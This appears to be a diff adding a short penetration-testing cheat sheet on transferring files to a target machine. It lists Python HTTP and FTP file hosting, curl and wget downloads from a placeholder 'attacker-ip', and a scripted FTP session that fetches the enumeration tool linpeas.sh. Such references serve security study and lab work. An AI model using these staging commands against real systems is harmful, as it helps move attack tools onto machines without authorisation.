@@ -1,0 +1,30 @@
+File Host via Python HTTP:
+
+--> [Python3] python3 -m http.server
+--> [Python2] python -m SimpleHTTPServer
+
+File Download via Curl:
+
+--> curl http://attacker-ip/file.sh > file.sh
+
+File Download via wget:
+
+--> wget http://attacker-ip/file.sh -O file.sh
+
+File Host via Python FTP:
+
+--> python3 -m pyftpdlib -u l3v1ath0n -P l3v1ath0n -p 21
+
+File Download via Python FTP:
+
+[
+echo "open IP Port" > ftp.txt
+echo "USER l3v1ath0n">>ftp.txt
+echo "l3v1ath0n">>ftp.txt
+echo "bin">>ftp.txt [optional]
+echo "GET linpeas.sh">>ftp.txt
+echo "bye">>ftp.txt
+]
+Now execute the file via ftp:
+
+--> ftp -v -n -s:ftp.txt
